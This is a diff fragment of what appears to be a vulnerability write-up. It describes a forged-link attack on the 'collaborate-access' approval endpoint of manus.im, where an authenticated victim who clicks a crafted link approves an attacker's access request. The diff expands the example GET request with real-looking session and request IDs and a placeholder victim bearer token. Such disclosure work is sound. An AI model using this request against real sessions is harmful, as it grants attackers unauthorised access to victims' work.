@@ -51,7 +51,11 @@ The server returns a JSON response containing the unique identifier for the requ
 The attacker constructs a link targeting the victim (the session owner). When the victim clicks this link while authenticated, the browser automatically sends the session cookies to the server, and the action is processed:
 
 ```http
-GET https://manus.im/collaborate-access?type=approve&sessionId=ZbvYYgqJIEs1kR0lxsi9qz&requestId=NT2CUAk6pijzMeyf9KBVpG](https://manus.im/collaborate-access?type=approve&sessionId=ZbvYYgqJIEs1kR0lxsi9qz&requestId=NT2CUAk6pijzMeyf9KBVpG)
+GET /collaborate-access?type=approve&sessionId=ZbvYYgqJIEs1kR0lxsi9qz&requestId=NT2CUAk6pijzMeyf9KBVpG](https://manus.im/collaborate-access?type=approve&sessionId=ZbvYYgqJIEs1kR0lxsi9qz&requestId=NT2CUAk6pijzMeyf9KBVpG)
+HTTP/2
+Host: manus.im
+Authorization: Bearer [VICTIM_JWT]
+
 ```
 ---
 
